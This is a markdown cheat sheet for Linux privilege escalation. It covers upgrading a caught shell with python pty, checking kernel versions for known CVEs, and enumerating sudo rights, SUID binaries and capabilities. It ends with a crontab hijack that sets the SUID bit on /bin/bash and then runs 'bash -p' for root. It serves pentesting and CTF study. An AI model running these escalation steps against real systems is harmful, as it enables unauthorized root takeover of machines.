- #### Try to upgrade to TTY shell (if you have a basic listener).
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
or e.g. if that fails:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- #### Check if Kernel / OS is out of date

```bash
uname -a
```
```bash
cat /etc/os-release
```
or
```bash
cat /etc/*release
``` 
for older systems.

Find a known CVE and its related exploits using google/searchsploit. Make sure you understand what the exploit does so as not to break anything on the server.

---

- #### Look for programs that your user can run with sudo rights

Run `sudo -l`

Use [GTFOBins](https://gtfobins.github.io/) to find information on how binaries with sudo rights can be used.

---

- #### Look for programs with SUID or GUID bit set

```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Use [GTFOBins](https://gtfobins.github.io/#+suid) to find attack vectors

---

- #### Find binaries with *Capabilities*

```bash
getcap -r / 2>/dev/null
```

Use [GTFOBins](https://gtfobins.github.io/) to find attack vectors

---

- #### Look for crontab vulnerabilities

```bash
cat /etc/crontab
```

If you can modify a script that is run by cron you can get root access.

e.g.

```bash
#!/bin/bash
chmod u+s /bin/bash #Set the SUID bit on /bin/bash
````
run the command

```bash
/bin/bash -p
```

to run bash in privileged mode.

---
